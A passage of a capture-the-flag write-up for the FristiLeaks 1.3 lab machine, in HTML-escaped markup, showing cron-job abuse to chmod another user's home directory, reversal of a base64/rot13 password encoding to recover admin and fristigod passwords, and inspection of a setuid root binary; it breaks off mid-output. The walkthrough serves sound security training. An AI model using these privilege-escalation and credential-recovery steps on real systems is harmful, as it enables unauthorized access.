&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  31800 Nov 17  2015 chkconfig
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  48712 Nov 17  2015 &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  53640 Nov 17  2015 &lt;span class=&quot;nb&quot;&gt;chown&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  44528 Nov 17  2015 clock
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz   4808 Nov 17  2015 consoletype
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz 129992 Nov 17  2015 cpio
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  38608 Nov 17  2015 cryptsetup
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz   5344 Nov 17  2015 ctrlaltdel
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  41704 Nov 17  2015 &lt;span class=&quot;nb&quot;&gt;cut&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  14832 Nov 17  2015 halt
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  13712 Nov 17  2015 &lt;span class=&quot;nb&quot;&gt;hostname&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  44528 Nov 17  2015 hwclock
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz   7920 Nov 17  2015 kbd_mode
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  11576 Nov 17  2015 &lt;span class=&quot;nb&quot;&gt;kill&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  16472 Nov 17  2015 killall5
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  32928 Nov 17  2015 kpartx
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  11464 Nov 17  2015 nameif
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz 171784 Nov 17  2015 nano
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz   5512 Nov 17  2015 netreport
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz 123360 Nov 17  2015 netstat
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  13892 Nov 17  2015 new-kernel-pkg
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  25208 Nov 17  2015 &lt;span class=&quot;nb&quot;&gt;nice&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  13712 Nov 17  2015 nisdomainname
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz   4736 Nov 17  2015 nologin
&lt;span class=&quot;nt&quot;&gt;-r--r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz    514 Nov 18  2015 notes.txt
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz 390616 Nov 17  2015 &lt;span class=&quot;nb&quot;&gt;tar&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  11352 Nov 17  2015 taskset
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz 249000 Nov 17  2015 tc
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  51536 Nov 17  2015 telinit
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  47928 Nov 17  2015 &lt;span class=&quot;nb&quot;&gt;touch&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  11440 Nov 17  2015 tracepath
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  12304 Nov 17  2015 tracepath6
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  21112 Nov 17  2015 &lt;span class=&quot;nb&quot;&gt;true&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  35608 Nov 17  2015 tune2fs
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  15410 Nov 17  2015 weak-modules
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  12216 Nov 17  2015 wipefs
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz 504400 Nov 17  2015 xfs_repair
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  13712 Nov 17  2015 ypdomainname
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz     62 Nov 17  2015 zcat
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 eezeepz eezeepz  47520 Nov 17  2015 zic
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Dang, tons of crap in here. But hey, there’s another &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;notes.txt&lt;/code&gt;, let’s see what this one says:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;notes.txt
Yo EZ,

I made it possible &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;you to &lt;span class=&quot;k&quot;&gt;do &lt;/span&gt;some automated checks, 
but I did only allow you access to /usr/bin/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; system binaries. I did
however copy a few extra often needed commands to my 
homedir: &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt;, &lt;span class=&quot;nb&quot;&gt;df&lt;/span&gt;, &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;, &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;, ps, &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt;, egrep so you can use those
from /home/admin/

Don&lt;span class=&quot;s1&quot;&gt;'t forget to specify the full path for each binary!

Just put a file called &quot;runthis&quot; in /tmp/, each line one command. The 
output goes to the file &quot;cronresult&quot; in /tmp/. It should 
run every minute with my account privileges.

- Jerry
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay cool! So basically we can run &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;df&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cat&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;echo&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;ps&lt;/code&gt;, &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;grep&lt;/code&gt;, and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;egrep&lt;/code&gt; as Jerry.. whose username is &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;admin&lt;/code&gt; on the box itself.&lt;/p&gt;

&lt;p&gt;Following his directions, we’ll create a file called &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;runthis&lt;/code&gt; in &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/tmp&lt;/code&gt;… Inside of it we can put one of those binary commands.&lt;/p&gt;

&lt;p&gt;Looking at our options, I think our best bet would be to use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;chmod&lt;/code&gt; to allow us access to Jerry’s home directory. We can do this via:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;/home/admin/chmod 777 /home/admin&quot;&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;&amp;gt;&amp;gt;&lt;/span&gt; /tmp/runthis
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;And after waiting a minute or so, we can see the following inside of cronresult:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;executing: /home/admin/chmod 777 /home/admin
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool! Let’s go take a look:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt; /home/admin
total 652
drwxrwxrwx. 2 admin     admin       4096 Nov 19  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x. 5 root      root        4096 Nov 19  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 admin     admin         18 Sep 22  2015 .bash_logout
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 admin     admin        176 Sep 22  2015 .bash_profile
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; 1 admin     admin        124 Sep 22  2015 .bashrc
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;  1 admin     admin      45224 Nov 18  2015 &lt;span class=&quot;nb&quot;&gt;cat&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;  1 admin     admin      48712 Nov 18  2015 &lt;span class=&quot;nb&quot;&gt;chmod&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 admin     admin        737 Nov 18  2015 cronjob.py
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 admin     admin         21 Nov 18  2015 cryptedpass.txt
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 admin     admin        258 Nov 18  2015 cryptpass.py
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;  1 admin     admin      90544 Nov 18  2015 &lt;span class=&quot;nb&quot;&gt;df&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;  1 admin     admin      24136 Nov 18  2015 &lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;  1 admin     admin     163600 Nov 18  2015 egrep
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;  1 admin     admin     163600 Nov 18  2015 &lt;span class=&quot;nb&quot;&gt;grep&lt;/span&gt;
&lt;span class=&quot;nt&quot;&gt;-rwxr-xr-x&lt;/span&gt;  1 admin     admin      85304 Nov 18  2015 ps
&lt;span class=&quot;nt&quot;&gt;-rw-r--r--&lt;/span&gt;  1 fristigod fristigod     25 Nov 19  2015 whoisyourgodnow.txt
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;There are a couple files that look interesting. Let’s start by analyzing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cryptedpass.txt&lt;/code&gt; and &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cryptpass.py&lt;/code&gt;:&lt;/p&gt;

&lt;h4 id=&quot;cryptedpasstxt&quot;&gt;cryptedpass.txt:&lt;/h4&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;cryptedpass.txt
mVGZ3O3omkJLmy2pcuTq
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;h4 id=&quot;cryptpasspy&quot;&gt;cryptpass.py:&lt;/h4&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;n&quot;&gt;cat&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cryptpass&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;py&lt;/span&gt;
&lt;span class=&quot;c1&quot;&gt;#Enhanced with thanks to Dinesh Singh Sikawar @LinkedIn
&lt;/span&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;codecs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;def&lt;/span&gt; &lt;span class=&quot;nf&quot;&gt;encodeString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;base64string&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;base64&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;b64encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;str&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;return&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;codecs&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;base64string&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[::&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;-&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;],&lt;/span&gt; &lt;span class=&quot;s&quot;&gt;'rot13'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;

&lt;span class=&quot;n&quot;&gt;cryptoResult&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;encodeString&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;sys&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;argv&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;1&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;])&lt;/span&gt;
&lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;cryptoResult&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Okay cool. So we have some ciphertext and the funciton that creates it. Let’s unpack what &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;cryptpass.py&lt;/code&gt; is doing.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;First it takes a string (&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;str&lt;/code&gt;) and base64 encodes it. Pretty simple.&lt;/li&gt;
  &lt;li&gt;Next, it uses the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;codecs.encode&lt;/code&gt; function to perform a rot13 substitution on the base64 encoded text.&lt;/li&gt;
  &lt;li&gt;But wait, what’s the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;[::-1]&lt;/code&gt; thing attached to the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;base64string&lt;/code&gt; string? Turns out this is simply reversing the string.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Okay cool… So knowing what the script does, if we simply reverse the steps, we should get the cleartext password. I used the following command to get the cleartext password:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~/VulnHub/FristiLeaks1.3:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;mVGZ3O3omkJLmy2pcuTq&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[A-Za-z]'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[N-ZA-Mn-za-m]'&lt;/span&gt; | rev | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
thisisalsopw123
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Cool, now let’s try logging in as admin using this password:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;bash-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su admin
su admin
Password: thisisalsopw123

&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;admin@localhost .secret_admin_stuff]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;id
id
&lt;/span&gt;&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;501&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;admin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;501&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;admin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;501&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;admin&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;admin@localhost .secret_admin_stuff]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Nice!&lt;/p&gt;

&lt;p&gt;Looking through our home directory there’s still the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;whoisyourgodnow.txt&lt;/code&gt; file owned by &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;fristigod&lt;/code&gt;:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cat &lt;/span&gt;whoisyourgodnow.txt
&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;RFn0AKnlMHMPIzpyuTI0ITG
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hmm…. Wonder if this uses the same algorithm we just reversed?&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;ein@~/VulnHub/FristiLeaks1.3:&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;echo&lt;/span&gt; &lt;span class=&quot;s2&quot;&gt;&quot;=RFn0AKnlMHMPIzpyuTI0ITG&quot;&lt;/span&gt; | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[A-Za-z]'&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'[N-ZA-Mn-za-m]'&lt;/span&gt; | rev | &lt;span class=&quot;nb&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt;
LetThereBeFristi!
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Sure does!&lt;/p&gt;

&lt;p&gt;Let’s hop over to this user and see what’s in their home directory:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;admin@localhost ~]&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;su fristigod
su fristigod
Password: LetThereBeFristi!

bash-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~
&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; ~
bash-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 16
drwxr-x---   3 fristigod fristigod 4096 Nov 25  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-xr-x. 19 root      root      4096 Nov 19  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rw-------&lt;/span&gt;   1 fristigod fristigod  864 Nov 25  2015 .bash_history
drwxrwxr-x.  2 fristigod fristigod 4096 Nov 25  2015 .secret_admin_stuff
bash-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Hmm.. what’s in the &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;.secret_admin_stuff&lt;/code&gt; directory?&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;cd&lt;/span&gt; .secret_admin_stuff
bash-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
&lt;span class=&quot;nb&quot;&gt;ls&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-la&lt;/span&gt;
total 16
drwxrwxr-x. 2 fristigod fristigod 4096 Nov 25  2015 &lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;
drwxr-x---  3 fristigod fristigod 4096 Nov 25  2015 ..
&lt;span class=&quot;nt&quot;&gt;-rwsr-sr-x&lt;/span&gt;  1 root      root      7529 Nov 25  2015 doCom
bash-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;An executable named &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;doCom&lt;/code&gt;. Let’s see what happens when we try to run it:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;./doCom
Nice try, but wrong user &lt;span class=&quot;p&quot;&gt;;&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
bash-4.1&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Huh. Maybe we need to use some sort of &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;sudo&lt;/code&gt; trick to pass it a certain UID?&lt;/p&gt;

&lt;p&gt;Before we get too deep, let’s use &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;strings&lt;/code&gt; to see what’s hiding inside the binary:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;strings doCom
/lib64/ld-linux-x86-64.so.2
__gmon_start__
libc.so.6
setuid
&lt;span class=&quot;nb&quot;&gt;exit
&lt;/span&gt;strcat
stderr
system
getuid
fwrite
__libc_start_main
GLIBC_2.2.5
fff.
fffff.
l&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;L
t&lt;span class=&quot;si&quot;&gt;$(&lt;/span&gt;L
